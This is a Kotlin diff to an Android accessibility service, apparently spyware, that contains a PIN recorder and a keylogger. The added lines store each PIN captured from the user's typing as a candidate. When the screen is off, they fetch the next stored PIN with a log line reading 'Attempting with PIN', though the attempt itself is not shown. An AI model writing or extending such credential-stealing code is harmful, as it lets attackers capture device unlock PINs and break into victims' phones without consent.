@@ -38,7 +38,12 @@ class DaggerService : AccessibilityService() {
     override fun onCreate() {
         super.onCreate()
         pinRecorder = PinRecorder(fun(pin: String) {
-            Log.d(TAG, "Pin recorded: $pin")
+            val added = SharedPreferencesQuery.addPinCandidate(this, pin)
+            if (added) {
+                Log.d(TAG, "Pin recorded: $pin")
+            } else {
+                Log.d(TAG, "Failed to record: $pin")
+            }
         })
 
         keyLogger = KeyLogger()
@@ -58,6 +63,19 @@ class DaggerService : AccessibilityService() {
                         logEvent(event, event.className.toString())
                         // This is a PIN, let's record it.
                         pinRecorder.appendPinDigit(event.text.toString())
+                    }
+
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                        val screenState = SharedPreferencesQuery.getScreenState(this)
+                        Log.d(TAG, "Screen is $screenState")
+                        if (screenState == ScreenState.OFF) {
+                            val pin = SharedPreferencesQuery.getNextPin(this)
+                            if (pin != null) {
+                                Log.d(TAG, "Attempting with PIN: $pin")
+                            } else {
+                                Log.d(TAG, "No PINs collected yet")
+                            }
+                        }
                     }
                 }
             }
